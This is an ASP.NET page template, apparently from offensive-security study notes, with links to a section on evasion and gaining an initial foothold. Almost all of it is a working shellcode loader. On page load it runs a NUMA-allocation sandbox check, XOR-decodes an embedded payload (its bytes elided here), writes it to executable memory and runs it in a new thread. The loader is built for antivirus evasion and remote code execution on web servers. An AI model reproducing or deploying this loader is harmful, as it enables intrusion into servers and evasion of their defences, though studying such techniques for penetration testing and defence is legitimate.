```
****<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
        return;
        }
        
        byte[] mktYiKO = new byte[726] {
            0x06, ..., 0x2f
            };
        for (int i = 0; i < mktYiKO.Length; i++)
        {
            mktYiKO[i] = (byte)((uint)mktYiKO[i] ^ 0xfa);
        }
        IntPtr tRJp = VirtualAlloc(IntPtr.Zero,(UIntPtr)mktYiKO.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(mktYiKO,0,tRJp,mktYiKO.Length);
        IntPtr qt4_wdw1eH = IntPtr.Zero;
        IntPtr efMM0061O = CreateThread(IntPtr.Zero,UIntPtr.Zero,tRJp,IntPtr.Zero,0,ref qt4_wdw1eH);
    }
</script>
```

For Encryption use: [[CS_XOR_Encryptor_for_VBA_and_CSHARP]]

More Info:
[[Evasion Techniques and Breaching Defenses#17 1 2 Gaining an Initial Foothold]]